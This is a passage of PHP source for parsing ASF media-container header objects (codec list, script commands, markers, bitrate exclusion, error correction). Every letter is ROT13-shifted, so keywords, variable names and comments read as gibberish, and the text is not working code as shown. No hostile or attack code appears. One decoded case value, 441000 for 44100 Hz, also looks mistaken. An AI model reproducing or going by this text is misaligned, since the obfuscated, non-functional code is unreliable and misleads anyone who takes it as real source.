					$guvfsvyr_nfs_pbqrpyvfgbowrpg['bowrpgfvmr']                = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_pbqrpyvfgbowrpg['erfreirq']                  = fhofge($NFSUrnqreQngn, $bssfrg, 16);
					$bssfrg += 16;
					$guvfsvyr_nfs_pbqrpyvfgbowrpg['erfreirq_thvq']             = $guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_pbqrpyvfgbowrpg['erfreirq']);
					vs ($guvfsvyr_nfs_pbqrpyvfgbowrpg['erfreirq'] != $guvf->THVQgbOlgrfgevat('86Q15241-311Q-11Q0-N3N4-00N0P90348S6')) {
						$guvf->jneavat('pbqrp_yvfg_bowrpg.erfreirq THVQ {'.$guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_pbqrpyvfgbowrpg['erfreirq']).'} qbrf abg zngpu rkcrpgrq \"TRGVQ3_NFS_Erfreirq_1\" THVQ {86Q15241-311Q-11Q0-N3N4-00N0P90348S6}');
						//erghea snyfr;
						oernx;
					}
					$guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf_pbhag'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
					vs ($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf_pbhag'] > 0) {
						$guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'] = neenl();
					}
					$bssfrg += 4;
					sbe ($PbqrpRagelPbhagre = 0; $PbqrpRagelPbhagre < $guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf_pbhag']; $PbqrpRagelPbhagre++) {
						// fubegphg
						$guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'][$PbqrpRagelPbhagre] = neenl();
						$guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag = &$guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf'][$PbqrpRagelPbhagre];

						$guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['glcr_enj'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
						$bssfrg += 2;
						$guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['glcr'] = frys::pbqrpYvfgBowrpgGlcrYbbxhc($guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['glcr_enj']);

						$PbqrpAnzrYratgu = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2)) * 2; // 2 olgrf cre punenpgre
						$bssfrg += 2;
						$guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['anzr'] = fhofge($NFSUrnqreQngn, $bssfrg, $PbqrpAnzrYratgu);
						$bssfrg += $PbqrpAnzrYratgu;

						$PbqrpQrfpevcgvbaYratgu = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2)) * 2; // 2 olgrf cre punenpgre
						$bssfrg += 2;
						$guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['qrfpevcgvba'] = fhofge($NFSUrnqreQngn, $bssfrg, $PbqrpQrfpevcgvbaYratgu);
						$bssfrg += $PbqrpQrfpevcgvbaYratgu;

						$PbqrpVasbezngvbaYratgu = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
						$bssfrg += 2;
						$guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['vasbezngvba'] = fhofge($NFSUrnqreQngn, $bssfrg, $PbqrpVasbezngvbaYratgu);
						$bssfrg += $PbqrpVasbezngvbaYratgu;

						vs ($guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['glcr_enj'] == 2) { // nhqvb pbqrp

							vs (fgecbf($guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['qrfpevcgvba'], ',') === snyfr) {
								$guvf->jneavat('[nfs][pbqrp_yvfg_bowrpg][pbqrp_ragevrf]['.$PbqrpRagelPbhagre.'][qrfpevcgvba] rkcrpgrq gb pbagnva pbzzn-frcnengrq yvfg bs cnenzrgref: \"'.$guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['qrfpevcgvba'].'\"');
							} ryfr {

								yvfg($NhqvbPbqrpOvgengr, $NhqvbPbqrpSerdhrapl, $NhqvbPbqrpPunaaryf) = rkcybqr(',', $guvf->GevzPbaireg($guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['qrfpevcgvba']));
								$guvfsvyr_nhqvb['pbqrp'] = $guvf->GevzPbaireg($guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['anzr']);

								vs (!vffrg($guvfsvyr_nhqvb['ovgengr']) && fgefge($NhqvbPbqrpOvgengr, 'xocf')) {
									$guvfsvyr_nhqvb['ovgengr'] = (vag) gevz(fge_ercynpr('xocf', '', $NhqvbPbqrpOvgengr)) * 1000;
								}
								//vs (!vffrg($guvfsvyr_ivqrb['ovgengr']) && vffrg($guvfsvyr_nhqvb['ovgengr']) && vffrg($guvfsvyr_nfs['svyr_cebcregvrf_bowrpg']['znk_ovgengr']) && ($guvfsvyr_nfs_pbqrpyvfgbowrpg['pbqrp_ragevrf_pbhag'] > 1)) {
								vs (rzcgl($guvfsvyr_ivqrb['ovgengr']) && !rzcgl($guvfsvyr_nhqvb['ovgengr']) && !rzcgl($vasb['ovgengr'])) {
									//$guvfsvyr_ivqrb['ovgengr'] = $guvfsvyr_nfs['svyr_cebcregvrf_bowrpg']['znk_ovgengr'] - $guvfsvyr_nhqvb['ovgengr'];
									$guvfsvyr_ivqrb['ovgengr'] = $vasb['ovgengr'] - $guvfsvyr_nhqvb['ovgengr'];
								}

								$NhqvbPbqrpSerdhrapl = (vag) gevz(fge_ercynpr('xUm', '', $NhqvbPbqrpSerdhrapl));
								fjvgpu ($NhqvbPbqrpSerdhrapl) {
									pnfr 8:
									pnfr 8000:
										$guvfsvyr_nhqvb['fnzcyr_engr'] = 8000;
										oernx;

									pnfr 11:
									pnfr 11025:
										$guvfsvyr_nhqvb['fnzcyr_engr'] = 11025;
										oernx;

									pnfr 12:
									pnfr 12000:
										$guvfsvyr_nhqvb['fnzcyr_engr'] = 12000;
										oernx;

									pnfr 16:
									pnfr 16000:
										$guvfsvyr_nhqvb['fnzcyr_engr'] = 16000;
										oernx;

									pnfr 22:
									pnfr 22050:
										$guvfsvyr_nhqvb['fnzcyr_engr'] = 22050;
										oernx;

									pnfr 24:
									pnfr 24000:
										$guvfsvyr_nhqvb['fnzcyr_engr'] = 24000;
										oernx;

									pnfr 32:
									pnfr 32000:
										$guvfsvyr_nhqvb['fnzcyr_engr'] = 32000;
										oernx;

									pnfr 44:
									pnfr 441000:
										$guvfsvyr_nhqvb['fnzcyr_engr'] = 44100;
										oernx;

									pnfr 48:
									pnfr 48000:
										$guvfsvyr_nhqvb['fnzcyr_engr'] = 48000;
										oernx;

									qrsnhyg:
										$guvf->jneavat('haxabja serdhrapl: \"'.$NhqvbPbqrpSerdhrapl.'\" ('.$guvf->GevzPbaireg($guvfsvyr_nfs_pbqrpyvfgbowrpg_pbqrpragevrf_pheerag['qrfpevcgvba']).')');
										oernx;
								}

								vs (!vffrg($guvfsvyr_nhqvb['punaaryf'])) {
									vs (fgefge($NhqvbPbqrpPunaaryf, 'fgrerb')) {
										$guvfsvyr_nhqvb['punaaryf'] = 2;
									} ryfrvs (fgefge($NhqvbPbqrpPunaaryf, 'zbab')) {
										$guvfsvyr_nhqvb['punaaryf'] = 1;
									}
								}

							}
						}
					}
					oernx;

				pnfr TRGVQ3_NFS_Fpevcg_Pbzznaq_Bowrpg:
					// Fpevcg Pbzznaq Bowrpg: (bcgvbany, bar bayl)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe Fpevcg Pbzznaq bowrpg - TRGVQ3_NFS_Fpevcg_Pbzznaq_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs Fpevcg Pbzznaq bowrpg, vapyhqvat 44 olgrf bs Fpevcg Pbzznaq Bowrpg urnqre
					// Erfreirq                     THVQ         128             // uneqpbqrq: 4O1NPOR3-100O-11Q0-N39O-00N0P90348S6
					// Pbzznaqf Pbhag               JBEQ         16              // ahzore bs Pbzznaqf fgehpgherf va gur Fpevcg Pbzznaqf Bowrpgf
					// Pbzznaq Glcrf Pbhag          JBEQ         16              // ahzore bs Pbzznaq Glcrf fgehpgherf va gur Fpevcg Pbzznaqf Bowrpgf
					// Pbzznaq Glcrf                neenl bs:    inevnoyr        //
					// * Pbzznaq Glcr Anzr Yratgu   JBEQ         16              // ahzore bs Havpbqr punenpgref sbe Pbzznaq Glcr Anzr
					// * Pbzznaq Glcr Anzr          JPUNE        inevnoyr        // neenl bs Havpbqr punenpgref - anzr bs n glcr bs pbzznaq
					// Pbzznaqf                     neenl bs:    inevnoyr        //
					// * Cerfragngvba Gvzr          QJBEQ        32              // cerfragngvba gvzr bs gung pbzznaq, va zvyyvfrpbaqf
					// * Glcr Vaqrk                 JBEQ         16              // glcr bs guvf pbzznaq, nf n mreb-onfrq vaqrk vagb gur neenl bs Pbzznaq Glcrf bs guvf bowrpg
					// * Pbzznaq Anzr Yratgu        JBEQ         16              // ahzore bs Havpbqr punenpgref sbe Pbzznaq Anzr
					// * Pbzznaq Anzr               JPUNE        inevnoyr        // neenl bs Havpbqr punenpgref - anzr bs guvf pbzznaq

					// fubegphg
					$guvfsvyr_nfs['fpevcg_pbzznaq_bowrpg'] = neenl();
					$guvfsvyr_nfs_fpevcgpbzznaqbowrpg      = &$guvfsvyr_nfs['fpevcg_pbzznaq_bowrpg'];

					$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['bssfrg']               = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['bowrpgvq']             = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['bowrpgvq_thvq']        = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['bowrpgfvmr']           = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['erfreirq']             = fhofge($NFSUrnqreQngn, $bssfrg, 16);
					$bssfrg += 16;
					$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['erfreirq_thvq']        = $guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_fpevcgpbzznaqbowrpg['erfreirq']);
					vs ($guvfsvyr_nfs_fpevcgpbzznaqbowrpg['erfreirq'] != $guvf->THVQgbOlgrfgevat('4O1NPOR3-100O-11Q0-N39O-00N0P90348S6')) {
						$guvf->jneavat('fpevcg_pbzznaq_bowrpg.erfreirq THVQ {'.$guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_fpevcgpbzznaqbowrpg['erfreirq']).'} qbrf abg zngpu rkcrpgrq \"TRGVQ3_NFS_Erfreirq_1\" THVQ {4O1NPOR3-100O-11Q0-N39O-00N0P90348S6}');
						//erghea snyfr;
						oernx;
					}
					$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['pbzznaqf_pbhag']       = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['pbzznaq_glcrf_pbhag']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					sbe ($PbzznaqGlcrfPbhagre = 0; $PbzznaqGlcrfPbhagre < $guvfsvyr_nfs_fpevcgpbzznaqbowrpg['pbzznaq_glcrf_pbhag']; $PbzznaqGlcrfPbhagre++) {
						$PbzznaqGlcrAnzrYratgu = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2)) * 2; // 2 olgrf cre punenpgre
						$bssfrg += 2;
						$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['pbzznaq_glcrf'][$PbzznaqGlcrfPbhagre]['anzr'] = fhofge($NFSUrnqreQngn, $bssfrg, $PbzznaqGlcrAnzrYratgu);
						$bssfrg += $PbzznaqGlcrAnzrYratgu;
					}
					sbe ($PbzznaqfPbhagre = 0; $PbzznaqfPbhagre < $guvfsvyr_nfs_fpevcgpbzznaqbowrpg['pbzznaqf_pbhag']; $PbzznaqfPbhagre++) {
						$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['pbzznaqf'][$PbzznaqfPbhagre]['cerfragngvba_gvzr']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
						$bssfrg += 4;
						$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['pbzznaqf'][$PbzznaqfPbhagre]['glcr_vaqrk']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
						$bssfrg += 2;

						$PbzznaqGlcrAnzrYratgu = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2)) * 2; // 2 olgrf cre punenpgre
						$bssfrg += 2;
						$guvfsvyr_nfs_fpevcgpbzznaqbowrpg['pbzznaqf'][$PbzznaqfPbhagre]['anzr'] = fhofge($NFSUrnqreQngn, $bssfrg, $PbzznaqGlcrAnzrYratgu);
						$bssfrg += $PbzznaqGlcrAnzrYratgu;
					}
					oernx;

				pnfr TRGVQ3_NFS_Znexre_Bowrpg:
					// Znexre Bowrpg: (bcgvbany, bar bayl)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe Znexre bowrpg - TRGVQ3_NFS_Znexre_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs Znexre bowrpg, vapyhqvat 48 olgrf bs Znexre Bowrpg urnqre
					// Erfreirq                     THVQ         128             // uneqpbqrq: 4PSRQO20-75S6-11PS-9P0S-00N0P90349PO
					// Znexref Pbhag                QJBEQ        32              // ahzore bs Znexre fgehpgherf va Znexre Bowrpg
					// Erfreirq                     JBEQ         16              // uneqpbqrq: 0k0000
					// Anzr Yratgu                  JBEQ         16              // ahzore bs olgrf va gur Anzr svryq
					// Anzr                         JPUNE        inevnoyr        // anzr bs gur Znexre Bowrpg
					// Znexref                      neenl bs:    inevnoyr        //
					// * Bssfrg                     DJBEQ        64              // olgr bssfrg vagb Qngn Bowrpg
					// * Cerfragngvba Gvzr          DJBEQ        64              // va 100-anabfrpbaq havgf
					// * Ragel Yratgu               JBEQ         16              // yratgu va olgrf bs (Fraq Gvzr + Syntf + Znexre Qrfpevcgvba Yratgu + Znexre Qrfpevcgvba + Cnqqvat)
					// * Fraq Gvzr                  QJBEQ        32              // va zvyyvfrpbaqf
					// * Syntf                      QJBEQ        32              // uneqpbqrq: 0k00000000
					// * Znexre Qrfpevcgvba Yratgu  QJBEQ        32              // ahzore bs olgrf va Znexre Qrfpevcgvba svryq
					// * Znexre Qrfpevcgvba         JPUNE        inevnoyr        // neenl bs Havpbqr punenpgref - qrfpevcgvba bs znexre ragel
					// * Cnqqvat                    OLGRFGERNZ   inevnoyr        // bcgvbany cnqqvat olgrf

					// fubegphg
					$guvfsvyr_nfs['znexre_bowrpg'] = neenl();
					$guvfsvyr_nfs_znexrebowrpg     = &$guvfsvyr_nfs['znexre_bowrpg'];

					$guvfsvyr_nfs_znexrebowrpg['bssfrg']               = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_znexrebowrpg['bowrpgvq']             = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_znexrebowrpg['bowrpgvq_thvq']        = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_znexrebowrpg['bowrpgfvmr']           = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_znexrebowrpg['erfreirq']             = fhofge($NFSUrnqreQngn, $bssfrg, 16);
					$bssfrg += 16;
					$guvfsvyr_nfs_znexrebowrpg['erfreirq_thvq']        = $guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_znexrebowrpg['erfreirq']);
					vs ($guvfsvyr_nfs_znexrebowrpg['erfreirq'] != $guvf->THVQgbOlgrfgevat('4PSRQO20-75S6-11PS-9P0S-00N0P90349PO')) {
						$guvf->jneavat('znexre_bowrpg.erfreirq THVQ {'.$guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_znexrebowrpg['erfreirq']).'} qbrf abg zngpu rkcrpgrq \"TRGVQ3_NFS_Erfreirq_1\" THVQ {4PSRQO20-75S6-11PS-9P0S-00N0P90349PO}');
						oernx;
					}
					$guvfsvyr_nfs_znexrebowrpg['znexref_pbhag'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
					$bssfrg += 4;
					$guvfsvyr_nfs_znexrebowrpg['erfreirq_2'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					vs ($guvfsvyr_nfs_znexrebowrpg['erfreirq_2'] != 0) {
						$guvf->jneavat('znexre_bowrpg.erfreirq_2 ('.$guvfsvyr_nfs_znexrebowrpg['erfreirq_2'].') qbrf abg zngpu rkcrpgrq inyhr bs \"0\"');
						oernx;
					}
					$guvfsvyr_nfs_znexrebowrpg['anzr_yratgu'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					$guvfsvyr_nfs_znexrebowrpg['anzr'] = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_znexrebowrpg['anzr_yratgu']);
					$bssfrg += $guvfsvyr_nfs_znexrebowrpg['anzr_yratgu'];
					sbe ($ZnexrefPbhagre = 0; $ZnexrefPbhagre < $guvfsvyr_nfs_znexrebowrpg['znexref_pbhag']; $ZnexrefPbhagre++) {
						$guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['bssfrg']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 8));
						$bssfrg += 8;
						$guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['cerfragngvba_gvzr']         = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 8));
						$bssfrg += 8;
						$guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['ragel_yratgu']              = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
						$bssfrg += 2;
						$guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['fraq_gvzr']                 = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
						$bssfrg += 4;
						$guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['syntf']                     = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
						$bssfrg += 4;
						$guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['znexre_qrfpevcgvba_yratgu'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
						$bssfrg += 4;
						$guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['znexre_qrfpevcgvba']        = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['znexre_qrfpevcgvba_yratgu']);
						$bssfrg += $guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['znexre_qrfpevcgvba_yratgu'];
						$CnqqvatYratgu = $guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['ragel_yratgu'] - 4 -  4 - 4 - $guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['znexre_qrfpevcgvba_yratgu'];
						vs ($CnqqvatYratgu > 0) {
							$guvfsvyr_nfs_znexrebowrpg['znexref'][$ZnexrefPbhagre]['cnqqvat']               = fhofge($NFSUrnqreQngn, $bssfrg, $CnqqvatYratgu);
							$bssfrg += $CnqqvatYratgu;
						}
					}
					oernx;

				pnfr TRGVQ3_NFS_Ovgengr_Zhghny_Rkpyhfvba_Bowrpg:
					// Ovgengr Zhghny Rkpyhfvba Bowrpg: (bcgvbany)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe Ovgengr Zhghny Rkpyhfvba bowrpg - TRGVQ3_NFS_Ovgengr_Zhghny_Rkpyhfvba_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs Ovgengr Zhghny Rkpyhfvba bowrpg, vapyhqvat 42 olgrf bs Ovgengr Zhghny Rkpyhfvba Bowrpg urnqre
					// Rkyhfvba Glcr                THVQ         128             // angher bs zhghny rkpyhfvba eryngvbafuvc. bar bs: (TRGVQ3_NFS_Zhgrk_Ovgengr, TRGVQ3_NFS_Zhgrk_Haxabja)
					// Fgernz Ahzoref Pbhag         JBEQ         16              // ahzore bs ivqrb fgernzf
					// Fgernz Ahzoref               JBEQ         inevnoyr        // neenl bs zhghnyyl rkpyhfvir ivqrb fgernz ahzoref. 1 <= inyvq <= 127

					// fubegphg
					$guvfsvyr_nfs['ovgengr_zhghny_rkpyhfvba_bowrpg'] = neenl();
					$guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg       = &$guvfsvyr_nfs['ovgengr_zhghny_rkpyhfvba_bowrpg'];

					$guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['bssfrg']               = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['bowrpgvq']             = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['bowrpgvq_thvq']        = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['bowrpgfvmr']           = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['erfreirq']             = fhofge($NFSUrnqreQngn, $bssfrg, 16);
					$guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['erfreirq_thvq']        = $guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['erfreirq']);
					$bssfrg += 16;
					vs (($guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['erfreirq'] != TRGVQ3_NFS_Zhgrk_Ovgengr) && ($guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['erfreirq'] != TRGVQ3_NFS_Zhgrk_Haxabja)) {
						$guvf->jneavat('ovgengr_zhghny_rkpyhfvba_bowrpg.erfreirq THVQ {'.$guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['erfreirq']).'} qbrf abg zngpu rkcrpgrq \"TRGVQ3_NFS_Zhgrk_Ovgengr\" THVQ {'.$guvf->OlgrfgevatGbTHVQ(TRGVQ3_NFS_Zhgrk_Ovgengr).'} be  \"TRGVQ3_NFS_Zhgrk_Haxabja\" THVQ {'.$guvf->OlgrfgevatGbTHVQ(TRGVQ3_NFS_Zhgrk_Haxabja).'}');
						//erghea snyfr;
						oernx;
					}
					$guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['fgernz_ahzoref_pbhag'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
					$bssfrg += 2;
					sbe ($FgernzAhzorePbhagre = 0; $FgernzAhzorePbhagre < $guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['fgernz_ahzoref_pbhag']; $FgernzAhzorePbhagre++) {
						$guvfsvyr_nfs_ovgengrzhghnyrkpyhfvbabowrpg['fgernz_ahzoref'][$FgernzAhzorePbhagre] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
						$bssfrg += 2;
					}
					oernx;

				pnfr TRGVQ3_NFS_Reebe_Pbeerpgvba_Bowrpg:
					// Reebe Pbeerpgvba Bowrpg: (bcgvbany, bar bayl)
					// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
					// Bowrpg VQ                    THVQ         128             // THVQ sbe Reebe Pbeerpgvba bowrpg - TRGVQ3_NFS_Reebe_Pbeerpgvba_Bowrpg
					// Bowrpg Fvmr                  DJBEQ        64              // fvmr bs Reebe Pbeerpgvba bowrpg, vapyhqvat 44 olgrf bs Reebe Pbeerpgvba Bowrpg urnqre
					// Reebe Pbeerpgvba Glcr        THVQ         128             // glcr bs reebe pbeerpgvba. bar bs: (TRGVQ3_NFS_Ab_Reebe_Pbeerpgvba, TRGVQ3_NFS_Nhqvb_Fcernq)
					// Reebe Pbeerpgvba Qngn Yratgu QJBEQ        32              // ahzore bs olgrf va Reebe Pbeerpgvba Qngn svryq
					// Reebe Pbeerpgvba Qngn        OLGRFGERNZ   inevnoyr        // fgehpgher qrcraqf ba inyhr bs Reebe Pbeerpgvba Glcr svryq

					// fubegphg
					$guvfsvyr_nfs['reebe_pbeerpgvba_bowrpg'] = neenl();
					$guvfsvyr_nfs_reebepbeerpgvbabowrpg      = &$guvfsvyr_nfs['reebe_pbeerpgvba_bowrpg'];

					$guvfsvyr_nfs_reebepbeerpgvbabowrpg['bssfrg']                = $ArkgBowrpgBssfrg + $bssfrg;
					$guvfsvyr_nfs_reebepbeerpgvbabowrpg['bowrpgvq']              = $ArkgBowrpgTHVQ;
					$guvfsvyr_nfs_reebepbeerpgvbabowrpg['bowrpgvq_thvq']         = $ArkgBowrpgTHVQgrkg;
					$guvfsvyr_nfs_reebepbeerpgvbabowrpg['bowrpgfvmr']            = $ArkgBowrpgFvmr;
					$guvfsvyr_nfs_reebepbeerpgvbabowrpg['reebe_pbeerpgvba_glcr'] = fhofge($NFSUrnqreQngn, $bssfrg, 16);
					$bssfrg += 16;
					$guvfsvyr_nfs_reebepbeerpgvbabowrpg['reebe_pbeerpgvba_thvq'] = $guvf->OlgrfgevatGbTHVQ($guvfsvyr_nfs_reebepbeerpgvbabowrpg['reebe_pbeerpgvba_glcr']);
					$guvfsvyr_nfs_reebepbeerpgvbabowrpg['reebe_pbeerpgvba_qngn_yratgu'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 4));
					$bssfrg += 4;
					fjvgpu ($guvfsvyr_nfs_reebepbeerpgvbabowrpg['reebe_pbeerpgvba_glcr']) {
						pnfr TRGVQ3_NFS_Ab_Reebe_Pbeerpgvba:
							// fubhyq or ab qngn, ohg whfg va pnfr gurer vf, fxvc gb gur raq bs gur svryq
							$bssfrg += $guvfsvyr_nfs_reebepbeerpgvbabowrpg['reebe_pbeerpgvba_qngn_yratgu'];
							oernx;

						pnfr TRGVQ3_NFS_Nhqvb_Fcernq:
							// Svryq Anzr                   Svryq Glcr   Fvmr (ovgf)
							// Fcna                         OLGR         8               // ahzore bs cnpxrgf bire juvpu nhqvb jvyy or fcernq.
							// Iveghny Cnpxrg Yratgu        JBEQ         16              // fvmr bs ynetrfg nhqvb cnlybnq sbhaq va nhqvb fgernz
							// Iveghny Puhax Yratgu         JBEQ         16              // fvmr bs ynetrfg nhqvb cnlybnq sbhaq va nhqvb fgernz
							// Fvyrapr Qngn Yratgu          JBEQ         16              // ahzore bs olgrf va Fvyrapr Qngn svryq
							// Fvyrapr Qngn                 OLGRFGERNZ   inevnoyr        // uneqpbqrq: 0k00 * (Fvyrapr Qngn Yratgu) olgrf

							$guvfsvyr_nfs_reebepbeerpgvbabowrpg['fcna']                  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 1));
							$bssfrg += 1;
							$guvfsvyr_nfs_reebepbeerpgvbabowrpg['iveghny_cnpxrg_yratgu'] = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
							$bssfrg += 2;
							$guvfsvyr_nfs_reebepbeerpgvbabowrpg['iveghny_puhax_yratgu']  = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
							$bssfrg += 2;
							$guvfsvyr_nfs_reebepbeerpgvbabowrpg['fvyrapr_qngn_yratgu']   = trgvq3_yvo::YvggyrRaqvna2Vag(fhofge($NFSUrnqreQngn, $bssfrg, 2));
							$bssfrg += 2;
							$guvfsvyr_nfs_reebepbeerpgvbabowrpg['fvyrapr_qngn']          = fhofge($NFSUrnqreQngn, $bssfrg, $guvfsvyr_nfs_reebepbeerpgvbabowrpg['fvyrapr_qngn_yratgu']);
							$bssfrg += $guvfsvyr_nfs_reebepbeerpgvbabowrpg['fvyrapr_qngn_yratgu'];
							oernx;

						qrsnhyg:
